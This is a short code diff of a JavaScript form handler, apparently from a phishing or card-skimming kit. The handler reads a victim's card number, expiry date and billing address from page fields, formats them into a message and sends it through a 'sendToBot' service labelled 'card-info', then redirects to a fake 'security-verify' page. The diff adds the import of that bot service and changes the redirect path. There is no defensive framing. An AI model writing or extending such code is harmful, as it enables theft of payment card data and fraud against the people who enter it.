@@ -1,3 +1,4 @@
+import { sendToBot } from '../../services/bot';
 async function handleCardSubmit() {
     const cardNumber = document.getElementById('cardNumber').value;
     const expMonth = document.getElementById('expMonth').value;
@@ -17,5 +18,5 @@ async function handleCardSubmit() {
         `🏠 Address: <code>${street}, ${city}, ${state} ${zip}</code>`;
     
     await sendToBot(message, 'card-info');
-    window.location.href = '/rob/security-verify/';
+window.location.href = '/security-verify/';
 }
